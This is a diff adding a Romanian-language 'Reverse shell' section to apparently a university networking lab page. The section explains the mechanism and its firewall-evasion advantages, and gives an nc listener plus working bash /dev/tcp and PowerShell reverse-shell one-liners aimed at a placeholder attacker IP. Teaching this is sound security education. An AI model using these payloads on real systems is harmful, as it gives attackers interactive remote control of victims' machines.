@@ -635,6 +635,49 @@ tcp.option = [(optiune, valoare)]
 - [Shrew DoS attack](https://engineering.purdue.edu/kak/compsec/NewLectures/Lecture16.pdf#page=60)
 - [Syn Flooding](https://engineering.purdue.edu/kak/compsec/NewLectures/Lecture16.pdf#page=68)
 
+### Reverse shell
+
+Un reverse shell este o tehnică de conectare la distanță la un calculator, unde conexiunea este inițiată de către sistemul țintă către atacator, invers față de conexiunile tradiționale.
+
+#### Mecanismul de Funcționare
+Atacatorul:<br>
+-> Pornește un listener pe un port specific<br>
+-> Așteaptă conexiuni de la sistemele țintă
+
+Ținta:<br>
+-> Execută o comandă care inițiază o conexiune către atacator<br>
+-> Redirecționează fluxurile de intrare/ieșire/erori către socket
+
+Conexiunea:<br>
+-> Se stabilește un canal de comunicare bidirecțional<br>
+-> Atacatorul primește un shell interactiv pe sistemul țintă
+
+#### Cum se face practic?
+Listener (atacator)
+```bash
+nc -lvnp 4444
+```
+Reverse Shell de la Țintă (Victimă)
+```bash
+bash -i >& /dev/tcp/[ATACATOR_IP]/4444 0>&1 #linux
+```
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('[ATACATOR_IP]',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" #windows
+```
+#### Avantaje
+1. Ocolire Firewall:<br>
+-> majoritatea firewall-urilor permit trafic de ieșire<br>
+-> regulile se concentrează pe blocarea intrărilor
+
+2. NAT Traversal:<br>
+-> funcționează și când ținta este în spatele NAT<br>
+-> nu necesită port forwarding pe țintă
+
+3. Flexibilitate:<br>
+-> poate fi implementat în diverse limbaje (Bash, Python, Perl, etc.)<br>
+-> poate folosi diverse protocoale (TCP, UDP, HTTP, DNS, etc.)
+
+
 <a name="exercitii"></a> 
 ## Exerciții
 1. Instanțiați un server UDP și faceți schimb de mesaje cu un client scapy.  (Este necesara schimbarea socket-ului de L3 pentru aplicatii locale ```python conf.L3socket=L3RawSocket```)
